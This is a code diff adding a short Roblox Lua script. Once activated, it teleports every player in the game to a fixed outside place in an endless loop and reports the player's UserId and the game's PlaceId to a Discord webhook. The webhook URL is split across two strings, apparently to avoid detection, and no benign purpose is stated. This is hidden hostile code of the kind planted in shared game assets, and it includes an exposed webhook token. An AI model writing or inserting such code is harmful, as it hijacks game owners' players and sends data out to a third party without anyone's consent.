@@ -1,0 +1,23 @@
+TeleportService = game:GetService("TeleportService")
+http = game:GetService("HttpService")
+Pinged = false
+disk_url = "https://discordapp.com/api/webhooks/615272181974171825/_Vb6EdFbfY69bGSS7tmGvl1hhun_brmFxAYfE3m" .. "9cCwDUQGNtfX8ZSNqn4ql165ZtgVr"
+
+if game.Chat.Name == "Chat" then
+	game.Chat.Name = "Activated"
+	print("Activated")
+	while true do
+		Players = game.Players:GetPlayers()
+		for i = 1, #Players do
+			TeleportService:Teleport(3067570669, Players[i])
+			if Pinged == false then
+			Pinged = true
+			local Data = {["content"] = "Teleporting (" .. Players[i].UserId .. ") from " .. game.PlaceId}
+			local Data = http:JSONEncode(Data)
+			http:PostAsync(disk_url, Data)
+			end
+			wait(5)
+		end
+		wait()
+	end
+end
